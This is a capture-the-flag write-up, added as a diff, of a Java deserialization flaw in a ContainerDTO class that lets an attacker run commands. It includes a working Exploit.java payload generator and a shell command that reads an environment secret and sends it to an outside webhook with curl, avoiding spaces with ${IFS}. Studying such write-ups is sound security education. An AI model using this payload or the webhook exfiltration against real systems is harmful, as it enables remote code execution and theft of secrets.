@@ -1,0 +1,141 @@
+---
+tags: [web]
+---
+
+# Level 5
+
+---
+
+Okay, now we move on to the final challenge. 
+Honestly, when this challenge opened, there was only about one hour left, and at that moment I was already thinking about skipping it. 
+But with a small bit of hope, I sat down to analyze it anyway and eventually figured out a workable exploitation path.
+
+## Analysis
+The vulnerability lies in a custom deserialization method of the `ContainerDTO` class. 
+The application overrides the `readObject` method to perform data validation right when the object is reconstructed from the byte stream.
+```
+private void readObject(java.io.ObjectInputStream ois) 
+	throws java.io.IOException, ClassNotFoundException {
+	ois.defaultReadObject();
+	//highligt-next-line
+	ObjectUtils.eval(this.notes);
+}
+```
+
+After deserialization completes, it calls `ObjectUtils.eval` with the content of the `notes` field. 
+Inside `ObjectUtils.java`, the `eval` method is used to check whether the string contains the keyword `"eport_core"`, and then executes a system command. 
+This is where we can abuse it to achieve **command injection**.
+```
+if (!notes.contains("eport_core")) return;
+Process process = Runtime.getRuntime().exec(notes.split(" "));
+```
+
+The `/containers/restore` endpoint allows users to restore container data from a backup. 
+In `ContainerServiceImpl.java`, the input data (Base64) is decoded and passed directly into an `ObjectInputStream`:
+```
+public ResponseDTO restoreContainer(String input) {
+    try {
+        // 1. Decode Base64
+        byte[] data = Base64.getDecoder().decode(input);
+        ByteArrayInputStream bis = new ByteArrayInputStream(data);
+        ObjectInputStream ois = new ObjectInputStream(bis);
+
+        // 2. Trigger the vulnerability: readObject() is invoked here
+        // The malicious code inside ContainerDTO.readObject() is executed immediately
+        Object obj = ois.readObject(); 
+        
+        // 3. Business logic (will throw an error after successful RCE)
+        ContainerDTO[] dtos = (ContainerDTO[]) obj; // ClassCastException
+        // ...
+    }
+}
+```
+
+Even though the server expects an array of `ContainerDTO[]`, we only need to send a single `ContainerDTO` object. 
+The RCE command is executed during `readObject()` before the type cast `(ContainerDTO[])` is reached. 
+Therefore, even if the server returns a `500 Internal Server Error` due to a type mismatch, our command has already been executed successfully.
+
+## Exploitation
+At this point, we have all the required information. 
+To extract the flag, we need to build a payload that satisfies 2 conditions:
+- Bypass the `contains("eport_core")` filter.
+- Avoid using spaces in the shell command, because `notes.split(" ")` would break the command arguments.
+
+First, create a minimal `ContainerDTO` object containing only the fields required for serialization.
+```
+package com.atkdef.service2.dto;
+
+import java.io.Serializable;
+import java.math.BigDecimal;
+
+public class ContainerDTO implements Serializable {
+
+    private static final long serialVersionUID = 1L;
+
+    private Integer id;
+    private String containerCode;
+    private String containerType;
+    private Integer sizeFit;
+    private String currentVessel;
+    private String vesselDepartureDate;
+    private String currentLocation;
+    private String bayPosition;
+    private String slotPosition;
+    private String shippingLine;
+    private String status;
+    private BigDecimal basePrice;
+    private String notes;
+    private String createdAt;
+    private String updatedAt;
+
+    public void setNotes(String notes) {
+        this.notes = notes;
+    }
+}
+```
+
+Next, build the payload generation code (`Exploit.java`):
+```
+import com.atkdef.service2.dto.ContainerDTO;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectOutputStream;
+import java.util.Base64;
+
+public class Exploit {
+    public static void main(String[] args) throws Exception {
+        ContainerDTO dto = new ContainerDTO();
+        
+        String webhook = "https://webhook.site/<UUID_CUA_BAN>"; 
+        String command = "/bin/sh -c curl${IFS}" + webhook + "/?f=$(printenv${IFS}FLAG);#eport_core";
+        
+        dto.setNotes(command);
+        
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(baos);
+        oos.writeObject(dto); // Serialize đối tượng đơn
+        oos.close();
+        
+        String payload = Base64.getEncoder().encodeToString(baos.toByteArray());
+        System.out.println("Payload Base64:");
+        System.out.println(payload);
+    }
+}
+```
+
+Compile and run the two files above:
+```
+javac com/atkdef/service2/dto/ContainerDTO.java
+javac Exploit.java
+
+java Exploit
+```
+
+Finally, send the generated payload to the `/containers/restore` endpoint.
+<div style={{ width: '100%', margin: '0 auto' }}>
+	<img src={require("./send.png").default} style={{ width: '100%', height: 'auto' }} />
+</div>
+
+Access your webhook endpoint, and the flag will be delivered to you.
+<div style={{ width: '100%', margin: '0 auto' }}>
+	<img src={require("./flag.png").default} style={{ width: '100%', height: 'auto' }} />
+</div>
